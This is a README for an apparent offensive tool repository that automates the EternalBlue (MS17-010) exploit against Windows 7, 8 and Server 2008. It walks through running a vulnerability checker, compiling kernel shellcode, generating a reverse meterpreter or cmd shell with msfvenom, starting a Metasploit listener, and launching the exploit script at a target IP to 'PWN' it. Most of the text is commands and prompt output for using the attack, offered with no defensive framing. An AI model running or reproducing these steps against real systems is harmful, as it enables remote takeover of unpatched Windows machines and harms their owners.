# MS17-010_AutoBlue
Check For EternalBlue and auto pwn of Windows7,8 and 2008
run `python eternalblue_checker.py <TARGET-IP>`

## VIDEO TUTORIAL:
https://www.youtube.com/watch?v=p9OnxS1oDc0

## USAGE:
Navigate to the `shellcode` directory in the repo:

run `./shell_prep.sh`

Follow the prompts, for example:
```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
IP for reverse connection:
<YOUR-IP>
PORT you want x64 to listen on:
<SOME PORT>
PORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

After the script finishes there will be a shellcode binary named `sc_all.bin` in the shellcode directory


Next, navigate to the main repo directory:

run `listener_prep.sh`

Follow the propmts, for example:
```
 /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

IP for reverse connection:
<YOUR-IP>
PORT for x64 reverse connection:
<SOME PORT>
PORT for x86 reverse connection:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell:
0
Starting listener...
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

run `python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin>`

This has only been tested on Windows 7/Server 2008, however the exploit included in this repo also includes the Windows 8 version and *should* work.
